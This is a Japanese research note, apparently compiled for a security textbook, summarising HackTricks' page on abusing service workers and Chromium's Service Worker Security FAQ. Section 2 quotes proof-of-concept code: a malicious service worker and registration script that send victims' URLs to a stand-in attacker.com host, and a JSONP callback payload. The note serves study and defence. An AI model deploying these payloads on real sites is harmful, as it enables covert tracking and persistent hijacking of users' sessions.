# [42] Service Worker の悪用とChromiumのセキュリティ前提（クライアントサイド脆弱性ハンティング）

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|---|---|---|---|
| https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers | full | WebFetch/curl は `book.hacktricks.xyz` が組織のegressポリシーで403ブロック。代替として **HackTricks公式GitHubリポジトリの原本Markdown** を `curl https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md` で取得（HTTP 200, 6128 bytes） | book.hacktricks.xyz は現在 HackTricks の新ドメイン（book.hacktricks.wiki）へ移行中で、レンダリング元は HackTricks-wiki/hacktricks リポジトリの `src/…/abusing-service-workers.md`。取得したMarkdownはレンダリングページと同一の原文。全文（見出し・本文・PoCコード・参考文献）を逐語で取得済み。〔補足〕`book.hacktricks.xyz` の rendered URL のスラッグは `.md` を除いた `/pentesting-web/xss-cross-site-scripting/abusing-service-workers`。 |
| https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md | full | WebFetch/curl は `chromium.googlesource.com` が組織のegressポリシーで403ブロック。代替として **Chromium公式GitHubミラーの原本Markdown** を `curl https://raw.githubusercontent.com/chromium/chromium/main/docs/security/service-worker-security-faq.md` で取得（HTTP 200, 16591 bytes） | googlesource と GitHub ミラー（chromium/chromium）は同一ソースツリー。取得したMarkdownは chromium.googlesource.com がレンダリングする原文と同一。全Q&Aを逐語で取得済み。文書の最終更新は「Last updated 12 May 2017」。 |

（補足: `web.archive.org` は Claude Code から取得不可、`raw.githubusercontent.com/chromium/chromium/main/...` への直接WebFetchは一時的に503。最終的に `curl` 経由の raw.githubusercontent で両方full取得。egressプロキシは book.hacktricks.xyz / chromium.googlesource.com を含む多数のホスト（zenn.dev, qiita.com, cwe.mitre.org 等）を403で拒否している。）

## 要約（3〜10行）

- Service Worker（SW）はブラウザがバックグラウンドで実行するスクリプトで、`fetch` などのイベントを介してオリジン配下の**全ページのネットワーク通信を横取り・改変**できる。攻撃者がSWを登録できると、そのオリジンに対する**永続的（persistent）な制御**を得る。
- 登録には（1）**同一オリジンからSWスクリプトが配信されること**、（2）**セキュアコンテキスト（HTTPS または localhost）**、（3）正しい **JavaScript の MIME type** が必須。これがXSS単独ではSWを登録しづらくする防御になっている（攻撃者は「自オリジンにJSをホストする追加能力」＝任意JSアップロードやJSONPが必要）。
- 典型的攻撃: 「任意JSファイルのアップロード + XSS」または「出力を操作できる脆弱なJSONPエンドポイント + XSS」で、`fetch`イベントを乗っ取るSWを登録し、リクエストURLを攻撃者サーバへ送信したりレスポンスを改変したりする。
- `importScripts` は**任意オリジンからスクリプトを読み込め、CSPを回避**する。パラメータを攻撃者が制御できる（DOM Clobbering含む）と、外部の悪性JSを読み込ませてXSSにつながる。
- SWの登録は**無期限に残る**が、更新チェックがHTTPキャッシュを24時間ごとに無効化するため、XSS修正後の悪性SW残存は（オンライン前提で）**最大24時間**に制限される。防御はTTL短縮、kill-switch SW、`Clear-Site-Data`。
- Chromiumのセキュリティ前提: SWはレンダラプロセスのサンドボックス内、同一オリジンポリシー遵守、権限（geo/カメラ/USB等）はプロンプトなしには使えず、イベント（push等）が来なければコードは走らない。サードパーティiframeのSWはトップレベルサイトでパーティション化される。

---

## 詳細ノート

### 1. Service Worker の基本情報 （出典: HackTricks）

Service Worker（サービスワーカー）は、任意のWebページとは独立して、**ブラウザがバックグラウンドで実行するスクリプト**である。Webページやユーザー操作を必要としない機能を可能にし、**オフライン処理・バックグラウンド処理**能力を強化する。詳細な情報は developers.google.com の Service Workers Primer（`https://developers.google.com/web/fundamentals/primers/service-workers`）にある。

攻撃の観点では、**脆弱なWebドメイン内でSWを悪用することで、攻撃者はそのドメイン配下の全ページに対する被害者のインタラクションを制御下に置ける**。（HackTricks 参考文献[2]）

〔補足（一般知識）〕SWは「ネットワークプロキシ」として機能する。登録後、そのscope配下のページから発生する全ての `fetch`（ナビゲーション、サブリソース、XHR/fetch API）がSWの `fetch` イベントを経由しうる。これがSWを強力な攻撃ツールにする理由である。

#### 既存 Service Worker の確認 （出典: HackTricks）

既存のSWは、**Chrome DevTools の Application パネルの Service Workers セクション**から、検査（inspect）・更新（update）・停止（stop）・登録解除（unregister）ができる。Chromium はさらに、登録のグローバルな低レベルビューとして **`chrome://serviceworker-internals`** を公開している。（HackTricks 参考文献[3][7]）

#### プッシュ通知（Push Notifications） （出典: HackTricks）

**プッシュ通知の許可（Push notification permissions）**は、SWがユーザーの直接操作なしにサーバーと通信する能力に直接影響する。

- 許可が**拒否**されている場合、SWが継続的な脅威となる可能性は制限される。
- 逆に許可を**付与**すると、潜在的なエクスプロイトの受信と実行を可能にし、セキュリティリスクが増大する。

〔補足（一般知識）〕プッシュ通知の許可を得たSWは、ユーザーがサイトを訪れていない・タブを閉じていても、サーバからのpushメッセージをトリガーに `push` イベントで起動できる。これがSWによる「永続化（persistence）」を成立させる主要な経路。ただし後述のChromium FAQのとおり、pushには明示的なユーザー許可が必須で、SWが通知を生成しなければブラウザがユーザーに見える通知を出す（サイレント永続化の抑止）。

---

### 2. 攻撃: Service Worker の作成・登録 （出典: HackTricks）

この脆弱性を悪用するには、次のいずれかを見つける必要がある:

- **任意のJSファイルをサーバーにアップロードする方法** ＋ アップロードしたJSファイルのSWを読み込む **XSS**。
- **出力を操作できる（任意JSコードを含められる）脆弱なJSONPリクエスト** ＋ そのJSONPをペイロード付きで読み込ませて**悪性SWを読み込ませる XSS**。

〔補足（一般知識）〕なぜ「アップロード」や「JSONP」が必要か: SWは**同一オリジンから配信された正しいMIMEのスクリプトURL**でしか登録できないため（後述Chromium FAQ）、XSS単独では登録できない。攻撃者は「そのオリジンから任意のJS本文を返せる」追加の足がかり（任意ファイルアップロード、JSONPのcallback反射、オープンリダイレクトを絡めたJS配信など）を必要とする。

#### 2.1 `fetch` イベントを乗っ取るSW本体 （出典: HackTricks）

次のSWは `fetch` イベントを監視し、**リクエストされた各URLを攻撃者サーバに送信**する。これが脆弱なオリジンにアップロードするか、脆弱なJSONPエンドポイントから返させるコードである。

##### コード（原文のまま逐語）— SW本体（例: `ws_js.js`）

```javascript
self.addEventListener("fetch", (event) => {
  event.waitUntil(
    fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), {
      mode: "no-cors",
    }).catch(() => {}),
  )
  event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))
})
```

解説（原文の意図を日本語化）:
- `event.waitUntil(...)`: SWの寿命をこの非同期処理が終わるまで延長する。
- `fetch("https://attacker.com/fetch_url/" + encodeURIComponent(event.request.url), { mode: "no-cors" })`: 被害者がアクセスした**各URLを攻撃者サーバへ送信（漏えい）**。`mode: "no-cors"` によりクロスオリジン送信のCORSエラーを回避（レスポンスは読めないが送信は成立）。`.catch(() => {})` で送信失敗を握りつぶす。
- `event.respondWith(caches.match(event.request).then((response) => response || fetch(event.request)))`: **Cache API** で一致があればキャッシュ済みレスポンスを返し、なければ本来の `fetch` を返す。これが**レスポンス改変（response tampering）**の足場になる（`respondWith` に任意のResponseを渡せば偽のコンテンツを注入できる）。

〔補足（一般知識）〕`event.respondWith(...)` に攻撃者が構築した `new Response("<悪性HTML/JS>", {...})` を渡せば、ナビゲーションやサブリソースの**レスポンス本文を丸ごと差し替え**られる。`caches`（Cache API）は `caches.open(name)` → `cache.put(request, response)` / `cache.match(request)` でオリジン単位に永続的な応答キャッシュを持てるため、攻撃者は悪性レスポンスをキャッシュに植え付けて配信し続けられる。

#### 2.2 SWを登録する側のコード（XSSで実行するコード） （出典: HackTricks）

これが**ワーカーを登録するコード**（XSSを悪用して実行できるべきコード）である。この例では、SW登録の成否を攻撃者サーバに **GETリクエスト**で通知する。

##### コード（原文のまま逐語）— 登録スクリプト

```html
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```

解説:
- `var sw = "/uploaded/ws_js.js";`: 同一オリジン上にアップロード済みのSWスクリプトのパス。
- `navigator.serviceWorker.register(sw, {scope: '/'})`: SWを**scope `/`（オリジン全体）**で登録。scope配下の全ページの `fetch` を横取り可能にする。
- 成功時 `https://attacker.com/SW/success`、失敗時 `https://attacker.com/SW/error` へGETで通知。

〔補足（一般知識）〕`{scope: '/'}` を指定してオリジン全体を横取りするには、**SWスクリプト自身が `/` 以下に置かれ、かつスクリプトのパスがscope以上の階層である**必要がある。スクリプトが `/uploaded/ws_js.js` にあると既定の最大scopeは `/uploaded/` に制限される。これを `/` まで広げるには、SWスクリプトの応答に `Service-Worker-Allowed: /` レスポンスヘッダを付与する必要がある（下記の別節参照）。HackTricks原文のこの例は、SWスクリプトが適切なscopeで配信できる前提で `{scope: '/'}` を指定している。

#### 2.3 脆弱なJSONPエンドポイントを悪用する場合 （出典: HackTricks）

脆弱なJSONPエンドポイントを悪用する場合は、`var sw` の中にその値を入れる。例:

##### コード（原文のまま逐語）— JSONP悪用時の `sw` 値

```javascript
var sw =
  "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```

解説:
- JSONPの `callback` パラメータに反射されるコードを利用して、SWスクリプトとして解釈可能なJS（`onfetch = function(e){ ... }`）をそのオリジンから返させる。
- `//` 以降を行コメント化してJSONP応答末尾の余計なトークンを無効化。
- これにより「同一オリジンから正しいJSを返す」というSW登録要件を満たしつつ、`fetch`ハンドラを注入する。

#### 2.4 Shadow Workers（攻撃フレームワーク） （出典: HackTricks）

**Shadow Workers** は、Service Worker のエクスプロイトに特化した **command-and-control（C2）フレームワーク**である。（HackTricks 参考文献[4]、`https://shadow-workers.github.io`）

〔補足（一般知識）〕Shadow Workers はXSSで注入したSWを介して被害者ブラウザをC2に接続させ、被害オリジンのトラフィック傍受・クレデンシャル窃取・レスポンス改変などをオペレータのコンソールから操作できるツール群として公開されている（教育・許可された検証用途）。

#### 2.5 悪性SWの残存時間と kill-switch （出典: HackTricks）

SWの更新チェックは、前回のfetchが**24時間より前**に発生していた場合、**ブラウザのキャッシュをバイパス**する。しかしこれは悪性ワーカーが24時間以内に必ず消えることを**保証しない**: 変更後のスクリプトがfetch・install・activateされるまで、**古いワーカーはアクティブなまま残り続けられる**。

防御:
- ワーカースクリプトに**短いキャッシュ有効期間（TTL）**を設定する。
- **自身をunregisterし、悪性キャッシュをクリアする kill-switch ワーカーをデプロイ**する。

（HackTricks 参考文献[5] MDN `ServiceWorkerRegistration.update()`、[6] Service-worker kill-switch pattern）

---

### 3. SW内 `importScripts` の DOM Clobbering による悪用 （出典: HackTricks）

Service Worker から呼び出される **`importScripts`** 関数は、**別ドメインからスクリプトをインポート**できる。この関数が**攻撃者が改変可能なパラメータ**で呼ばれると、攻撃者は**自ドメインのJSスクリプトをインポート**してXSSを得られる。（HackTricks 参考文献[1]）

**これはCSP保護すら回避する（This even bypasses CSP protections.）。**

〔補足（一般知識）〕`importScripts()` はワーカーコンテキストのAPIで、指定URL（クロスオリジン可）のスクリプトを**同期的にフェッチして現在のワーカーグローバルで実行**する。ドキュメントの `<script>` に効くCSP（`script-src`）はワーカー内 `importScripts` を直接は制限しない（ワーカーのCSPは別途SWスクリプト応答のCSPヘッダで指定する必要がある）。このため、SWスクリプト応答にCSPが設定されていないと、`importScripts` の引数汚染はCSPを迂回して任意スクリプト実行になる。

#### 3.1 脆弱なコード例 （出典: HackTricks）

##### コード（原文のまま逐語）— `index.html`

```html
<script>
  navigator.serviceWorker.register(
    "/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
      location.search
  )
  // attacker controls location.search
</script>
```

##### コード（原文のまま逐語）— `sw.js`

```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```

解説:
- 登録URLに `location.search`（攻撃者制御のクエリ文字列）を連結している。
- SW内で `host = searchParams.get("host")` を取り、`importScripts(host + "/sw_extra.js")` で外部スクリプトを読み込む。`host` を攻撃者が制御できれば、攻撃者ドメインの `sw_extra.js` を読み込ませてXSS（CSP回避）に至る。

#### 3.2 DOM Clobbering との組み合わせ （出典: HackTricks）

DOM Clobbering の詳細は HackTricks の `dom-clobbering.md` を参照（原文の `{{#ref}} dom-clobbering.md {{#endref}}`）。

SWが `importScripts` の呼び出しに使うURL/ドメインが **HTML要素の中にある**場合、**DOM Clobbering によってそれを改変**し、SWに**自分のドメインからスクリプトを読み込ませる**ことが可能。（HackTricks 参考文献[1]）

具体例は参考リンク（PortSwigger Research「Hijacking service workers via DOM Clobbering」）を参照。（HackTricks 参考文献[1]）

〔補足（一般知識）〕DOM Clobbering は、`id`/`name` 属性を持つHTML要素がグローバル変数や `document.<name>` を上書きできる挙動を悪用する手法。SWスクリプトが `window.config.url` のようなDOM由来値を `importScripts` に渡す実装だと、HTMLインジェクション（scriptタグ不要でCSPを回避しやすい）だけでその値を攻撃者URLへ差し替えられる。

---

### 4. HackTricks の参考文献一覧 （出典: HackTricks、原文のまま逐語）

```
- [1] Hijacking service workers via DOM Clobbering — https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- [2] developers.google.com - Primers - Service Workers — https://developers.google.com/web/fundamentals/primers/service-workers
- [3] Chrome DevTools - Application panel overview — https://developer.chrome.com/docs/devtools/application
- [4] Shadow Workers — https://shadow-workers.github.io
- [5] MDN - ServiceWorkerRegistration.update() — https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update
- [6] Service-worker kill-switch pattern — https://stackoverflow.com/a/38980776
- [7] Chromium - Service Worker Security FAQ — https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md
```

---

### 5. Chromium: Service Worker Security FAQ （出典: Chromium docs、Last updated 12 May 2017）

この文書はChromium開発者による共同執筆（rsesek, estark, falken, slightlyoff, jakearchibald, evn, raymes, ainslie, mek, lgarron, elawrence, kinuko, palmer ほか）。SW固有のセキュリティFAQで、一般セキュリティFAQ（`faq.md`）も併読推奨。以下、各Q&Aを詳細に日本語化（固有名詞・数値・仕様参照は保持）。

#### Q. Service Worker はとても危険に見える。なぜ許容できるのか？

SWは確かに強力で、オフラインや断続的な接続でも動く魅力的なWebアプリ（ドキュメント編集、カタログ閲覧・購入、SNS投稿、メール作成など、地下鉄内でも）を支える。SWはWebプラットフォームをネイティブアプリと競争可能にしつつ、Open Web Platform（OWP）の「browse-to-use（開けばすぐ使える）」でサンドボックス化された性質を本質的に保つ。以降のFAQで、設計者・実装者がこの機能に伴うリスクをどう緩和したかを説明する。

SWは、OWPに長く存在してきたレガシーの **Application Cache API** の**置き換え・改良**である。背景は「Service Workers Explained」（`https://github.com/w3c/ServiceWorker/blob/master/explainer.md`）参照。

#### Q. Service Worker はサンドボックス内で動くか？

**Yes。SWはレンダラプロセス（renderer processes）内で動作する。** ChromeがSWを起動する際、SWのオリジンに関連付けられたレンダラプロセスを選ぶ。存在しなければ、そのオリジン用に新しい **`SiteInstance`**（`content/public/browser/site_instance.h`）を用いて新規プロセスを作成する。

〔補足（一般知識）〕これはSite Isolationの一部で、SWはそのオリジン専用のプロセスに割り当てられ、他サイトのメモリに直接触れられない。SWがサンドボックス外の特権を持つわけではない（下記「権限」参照）。

#### Q. Service Worker はどんなAPIにアクセスできるか？

- HTML仕様が「Workersが利用可能なAPI表面」を部分的に列挙している（`https://html.spec.whatwg.org/#apis-available-to-workers`）。`Client`、`ServiceWorkerGlobalScope` も参照。
- **注意: SWは同期API（synchronous APIs）にアクセスできない。**
- ただし他のWebプラットフォーム仕様が新しいAPI表面を追加しうる（例: Permissions API はworkerに `permissions` 属性を公開）。一般にSWはWebプラットフォームAPIの**サブセット**にアクセスでき、加えてワーカー／SW固有のAPI（ページ内JSには意味をなさないもの）がある。
- `[Service]WorkerGlobalScope` は必ずしも `Window` の厳密なサブセットではなく、`WorkerNavigator` も必ずしも `Navigator` の厳密なサブセットではない。各種SWイベントはSWにのみ公開される。

#### Q. Service Worker は同一オリジンポリシー（same-origin policy）に従うか？

- SW登録の仕様は、**SWがその呼び出し元と同一オリジンで動作しなければならない**と定めている（register-algorithm）。
- リクエストに対するSW登録の**オリジン比較**は、**パスを含むシリアライズ済みURLの最長前方一致（longest-prefix match）**として仕様化されている（scope-match-algorithm）。（例: `https://example.com/` != `https://example.com.evil.com/`。）この仕様上の緩さ（パス前方一致）は脆弱に見え、**実際のオリジン等価（origin equality）として仕様・実装し直すべき**（w3c/ServiceWorker#1118）だが、現時点で悪用可能には見えない。
- **Secure Contexts のみがSWを登録・使用できる（Only Secure Contexts can register or use Service Workers）。**
- SWは（任意の他オリジンからも）`importScripts` でスクリプトをインポートできるため、サイト運営者は**SWのJavaScript応答に `Content-Security-Policy` レスポンスヘッダを設定**し、信頼するスクリプトのソースをブラウザに指示するのが良い。これによりXSS攻撃者が自分のコードを引き込む能力を減らせる。

〔補足（一般知識）〕Secure Context ＝ HTTPS で配信されたページ、または `http://localhost` / `127.0.0.1` / `::1`（および `file:` を除くローカル扱いホスト）。平文HTTP（localhost以外）ではSWは登録できない。これがSWの登録前提の1つ「HTTPS必須」。

#### Q. Service Worker は永遠に生き続けるか？

「live（生きている）」には2つの概念がある: **インストール済みの登録（registration）**と、**実行中のSWスレッド**。

- **インストール済み登録は無期限に持続**する（IndexedDBなどオリジンスコープのストレージと同様）。
- ブラウザは、**SWを使う任意のナビゲーション後に更新チェックを行い、24時間ごとにHTTPキャッシュを無効化**する。加えて、サイトがキャッシュ利用をopt-inしない限り、**SWスクリプトのHTTPキャッシュを再検証（revalidate）**する。
- ブラウザは、**SWが起動するたび、および実行中は定期的に**、直近24時間（**86,400秒**、Handle Functional Event アルゴリズムで規定）にチェックしていなければ更新チェックを行う。
- ブラウザは**実行中のSWスレッドをほぼいつでも終了**できる。Chromeは**SWが30秒アイドル**なら終了する。また長時間実行ワーカーを検出して終了する: **イベントの決着に5分以上**かかる、または**同期JavaScript実行中でpingに30秒以内に応答しない**場合。SWが動いていないとき、DevTools と `chrome://serviceworker-internals` はステータスを **STOPPED** と表示する。
- 例外: **Payment Handler として登録されたSW**は、その payment handler ウィンドウが開いている限り実行を継続しうる。ユーザーがウィンドウを無期限に開いたままにはしないという想定に基づき、潜在リスクは無視できるとされる。

#### Q. Chrome で Service Worker をどう見るか？

- DevTools の **Application** タブの **Service Workers** フィールドで見られる。
- **`chrome://serviceworker-internals`** でも確認できる。

#### Q. タブを閉じた後もSWは動き続けるか？

- あるオリジンにSWが動いていれば、各ワーカーは**最後のイベントを処理した直後にシャットダウン**される。
- ワーカーを生かし続けられるイベントには**プッシュ通知（push notifications）**が含まれる。
  - プッシュ通知はSWが通知を作らない場合、**ユーザーに見える通知をブラウザが自動生成**する（`push_messaging_notification_manager.cc` 参照）。
  - プッシュ通知は**プロンプトでオリジンに許可を付与すること**を要する（simple-push-demo アプリでその挙動を確認できる）。

#### Q. 攻撃者はSW登録後に開発された攻撃をSW経由でトリガーできるか？

想定シナリオ: 攻撃者がユーザーを悪性サイトに訪問させ、後日（例）ChromeのV8バグがリポジトリに現れるのを待ち、エクスプロイトを書き、過去1か月に悪性サイトを訪れた全員のマシンでそれを実行する——ということは可能か？

- **ユーザーの明示的許可なしには、ブラウザはSWに攻撃者サーバのpush通知イベントをポーリング/受信させない**ため、SWはそのイベントを処理する機会を得られない。
- 同様に、`importScripts` で定期的に `maybe-v8-payload.js` を(再)読み込みしようとするSWを想像できるが、それは**イベントハンドラの一部としてしか実行できない**。ユーザーがattacker.comを閲覧・ナビゲートしておらず、push通知許可も与えていなければ、SWはイベントを一切受け取れず、イベントハンドラを実行できず、攻撃の機会を得られない。
- そもそもユーザーが現在attacker.comを閲覧しているなら、攻撃者はSWから追加の攻撃利益を得ない。ページ内JSから普通に `<script src="maybe-v8-payload.js">` を実行すればよいだけ。

#### Q. サイトにXSS脆弱性があると、攻撃者はそのオリジンを私に対して永続的に侵害できるか？

- **XSS攻撃者は確かに悪性SWを登録できる。** SW以前からXSSはWebオリジンに対する非常に強力な攻撃だった。
- XSS攻撃が悪性SWを登録するリスクを緩和するため、ブラウザは**SW登録URLがそのオリジン自身から来ること**を要求する。したがってXSSで悪性SWを登録するには、攻撃者は**自分のスクリプトをサーバー上にホストする追加能力**を必要とする。
- 別のエクスプロイトシナリオ: XSS脆弱ページに**JSONPエンドポイント**もある場合、攻撃者はそれを使って（1）**CSPをバイパス**し、（2）**SWを登録**し、（3）`importScripts` でサードパーティスクリプトをインポートして、次まで**永続化**できる:
  - サイト運営者が問題を検知・修正するまで、かつ
  - ユーザーがオンラインで再度サイトにアクセスするまで。
- XSS状況では、**24時間のキャッシュ指令の上限**により、悪性/侵害されたSWがXSS修正を生き延びるのは（クライアントがオンラインである前提で）**最大24時間**に保証される。運営者は**SWスクリプトに低いTTLを設定**して脆弱性ウィンドウを縮小できる。開発者には **kill-switch SW の構築**を推奨。
- この種の問題の正しいクリーンアップ戦略は **Clear-Site-Data**（`https://www.w3.org/TR/clear-site-data/`）。
- さらに運営者は、SWスクリプトを配信する想定がないドメイン/パスに対し、**`Service-Worker` リクエストヘッダを持つリクエストを無視すべき（例: `400 Bad Request` で応答）**。

#### Q. サイトはSWをオプトアウトできるか？

- 特定のドメイン/パスでSWを配信する意図がないサイトは、**`Service-Worker` リクエストヘッダをチェックして、ワーカースクリプトのリクエストを明示的に拒否**できる（service-worker-script-request）。

#### Q. 1つのオリジン、またはChrome自体はいくつのSWを起動できるか？

- **現在の仕様およびChromeの実装は、いかなる上限も定義していない。**

#### Q. 攻撃者はSWスクリプトをJPEG等の非スクリプトMIMEに「隠せる」か？

- 想定: サイトがアップロードを許すなら、攻撃者はJPEGをアップロードし、それをSWスクリプトとして使えるか？
- **SW仕様・実装は、SWスクリプトが正しいJavaScript MIME typeを持つことを要求する。** （加えて本文書の他所で述べたとおり、運営者はSWスクリプトを配信する意図のある正確なエンドポイント以外ではSWスクリプトリクエストを拒否すべき。）

〔補足（一般知識）〕正しいJavaScript MIME type とは `text/javascript`（または歴史的に許容される `application/javascript` 等）。`image/jpeg` や `text/plain` で返るファイルはSWスクリプトとして登録できず、登録は失敗する。これが「アップロードJSでのSW登録」に画像偽装を使えない理由。

#### Q. iframe はSWを登録できるか？

- **Yes、ただしそのiframe自身がセキュアコンテキストである場合に限る。** 定義上、トップレベルドキュメントまで含めて全ての親がセキュアコンテキストの中にネストされていなければならない。
- **サードパーティiframeが登録したSWは、サードパーティiframeのオリジンに加えてトップレベルサイトでパーティション化（partitioned）される**。サードパーティCookieがブロックされていても同様。詳細は「Partitioning Storage, Service Workers, and Communication APIs explainer」参照。

〔補足（一般知識）〕ストレージパーティショニングにより、`a.com` 内に埋め込まれた `tracker.com` のiframeが登録したSWと、`b.com` 内の同じ `tracker.com` のiframeが登録したSWは、別々のパーティションに分離される。クロスサイトでのSW経由トラッキング/横断的悪用を防ぐ狙い。

#### Q. なぜChromeはSW登録前にユーザーに確認しないのか？

- Chromeチームは、プライバシー関連の事柄（カメラ、マイク、位置情報など、単純で正確な名詞・動詞で表せるもの）についてはユーザーに尋ねる方針だが、**リソース利用（キャッシュ、永続化、CPUなど）については尋ねない**。これらは自動判断の方が適しているため（HTTPキャッシュや過去のGoogle Gearsもユーザーに尋ねなかった）。
- Chromeチームメンバー（Rebecca Rolfe, Ben Wells, Raymes Khoury）の非公式調査は、**iframe内オリジンのAPI呼び出しで発火する許可要求を、人々は一般に十分理解できない**ことを示唆。SWからの要求も同様に文脈を欠くと考えられる。

#### Q. SWを一切望まない場合は？

- **ブラウザデータのクリア（CBD; Settings の「Clear browsing data...」ボタン、または `chrome://settings/clearBrowserData`）はSWも削除する。** 検証手順:
  1. `https://gauntface.github.io/simple-push-demo/` を訪問。
  1. 2つ目のタブで `chrome://serviceworker-internals/` を開き、ACTIVATED かつ RUNNING のSWを見る（許可を与えるまでオリジンは実際にはpush通知を送れない）。
  1. 3つ目のタブで `chrome://settings/clearBrowserData` に行き、「Clear browsing data」でクリア。
  1. `chrome://serviceworker-internals/` をリロードし、SWのステータスが REDUNDANT かつ STOPPED になったことを確認。
  1. Simple Push Demo タブを閉じる。
  1. `chrome://serviceworker-internals/` をリロードし、SWが消えたことを確認。
- **個別のSW登録は `chrome://serviceworker-internals/` からも削除できる。**
- SWを避けるもう1つの方法は、（まだ）SWをサポートしないブラウザを使うこと。ただしOWPは今後も、secure・linkable・indexable・composable・ephemeral な強力プラットフォームへ進化する。SWはWebアプリをやや ephemeral でなくするが、適用範囲拡大の価値がそれに見合うと考える。
- ブラウザベンダはOWPのセキュリティ向上にコミットしており、これはW3C TAG、W3C WICG、blink-dev@chromium.org などの公開フォーラムでオープンに進む。

#### Q. サイト運営者向けのSWベストプラクティスは？

原文のとおり（逐語）:
- kill-switch SW を構築する（`https://stackoverflow.com/questions/33986976/...#38980776`）。
- **Clear-Site-Data** を使う（`https://www.w3.org/TR/clear-site-data/`）。
- クライアントがオフラインになりオンライン復帰後にキャッシュ済みリクエストをPOSTする必要があるため、**より長いセッション寿命**の必要性を意識する（cookie-handoff の手法参照）。

#### Q. どんなSWバグが Chrome VRP（脆弱性報奨金）の対象になるか？

このFAQで主張したセキュリティ表明の1つ以上を破れれば、VRPで報奨対象になりうる。非網羅的な例（原文のまま逐語に近い形で）:

```
*  Over-long registration/lifetime（例: 処理すべき着信イベントなしに実行/生存し続けられるSW）
*  Same-origin bypass または off-origin SW registration
*  プロンプト/チューザ/許可を要するAPIへの、オリジンに許可が付与されていない状態でのアクセス:
     *  Geolocation（位置情報）
     *  Hardware sensors（ハードウェアセンサ）
     *  Microphone, camera, media devices（マイク・カメラ・メディアデバイス）
     *  USB, Bluetooth
```

- 過去のSWセキュリティバグ一覧はChromiumバグトラッカーにある（`bugs.chromium.org` の `Type=Bug-Security serviceworker` クエリ）。
- 仕様のバグを見つけたら Security テンプレートで新規Chromiumバグを起票。該当仕様を実装する全ブラウザベンダにも起票するのが良い。
- Chrome実装のバグを見つけたら Security テンプレートで起票。Chrome Security Team が1〜2営業日でトリアージ。良い報告は問題を示す最小テストケースを伴う。

---

### 6. 〔補足（一般知識）〕タスクで指定された論点の補完

原文（HackTricks / Chromium FAQ）に**明示がないが、教科書で必要な**論点を、一般知識として補足する（原文由来ではないため各項目に補足マークを付す）。

- 〔補足（一般知識）〕**登録の3条件の整理**:
  1. **セキュアコンテキスト（HTTPS または localhost）**でのみ登録可（Chromium FAQ「Only Secure Contexts can register or use Service Workers」を具体化）。
  2. **SWスクリプトは登録元と同一オリジンから配信**され、**正しいJavaScript MIME type**（`text/javascript` 等）を持つこと。
  3. **scope（有効範囲）**は既定でSWスクリプトのパスのディレクトリ配下に制限される。
- 〔補足（一般知識）〕**`Service-Worker-Allowed` レスポンスヘッダ**: SWスクリプトの応答にこのヘッダを付けると、`register(url, {scope})` で指定できる**最大scopeを、スクリプトのパスを超えて広げられる**。例: `/js/sw.js` を配信する応答に `Service-Worker-Allowed: /` を付ければ、`{scope: '/'}` での登録が許可される。ヘッダがないと `/js/sw.js` の既定最大scopeは `/js/` に制限される。攻撃視点では、任意ファイルアップロード先が深いパスでも、このヘッダを攻撃者が制御できればオリジン全体を横取りするscopeに広げられる。（HackTricks の `{scope: '/'}` 例が成立する前提条件。）
- 〔補足（一般知識）〕**`Service-Worker` リクエストヘッダ**（Chromium FAQで言及）: ブラウザはSWスクリプトを取得する際、そのリクエストに `Service-Worker: script` ヘッダを付ける。運営者はこれを見て、SW配信を意図しないパスでは `400` 等で拒否できる（防御・診断の要点）。
- 〔補足（一般知識）〕**Cache API の悪用**: `caches.open(name)` → `cache.put(request, response)` でオリジンごとの永続応答キャッシュに悪性レスポンスを保存し、`fetch` ハンドラの `event.respondWith(caches.match(...))` で配信し続けられる。DevTools の Application → Cache Storage で確認・削除可能。
- 〔補足（一般知識）〕**SWの更新（update）と解除（unregister）**:
  - 更新: `registration.update()`（MDN、HackTricks参考[5]）でSWスクリプトの再取得と差分判定を強制できる。ブラウザは24時間ごと・ナビゲーション時にも自動で更新チェックする（Chromium FAQ）。バイト差分があれば新SWがinstall→（旧SW制御のクライアントが無くなった時点で）activate。`self.skipWaiting()` と `clients.claim()` で即時奪取が可能。
  - 解除: `registration.unregister()`、DevTools Application パネル、`chrome://serviceworker-internals`、Clear browsing data、`Clear-Site-Data` ヘッダのいずれでも解除・削除できる。
- 〔補足（一般知識）〕**foreign fetch の廃止**: かつて実験的に「foreign fetch」（他オリジンからのリクエストにサードパーティSWが応答できる仕組み）が提案・実装された（Chrome 54 付近でOrigin Trial）が、**セキュリティ/複雑性の懸念から廃止・削除**され、現行仕様には存在しない。現在SWの `fetch` イベントは**自オリジン（自scope）配下のリクエストにのみ**適用され、クロスオリジンの他者リクエストを横取りする正規手段はない。これはChromium FAQの「同一オリジンで動作」「呼び出し元と同一オリジン」の前提と整合する。（本文書FAQ自体は foreign fetch に言及していない＝2017年更新時点で既に方針が固まっていたため。）
- 〔補足（一般知識）〕**SWとSite Isolation**: Chromium FAQの「SWはオリジンの `SiteInstance` を用いるレンダラプロセスで動く」は、SWがSite Isolationの分離境界に乗ることを意味する。クロスサイトのSWは別プロセスに置かれ、Spectre等のサイドチャネルを含む越境を難しくする。
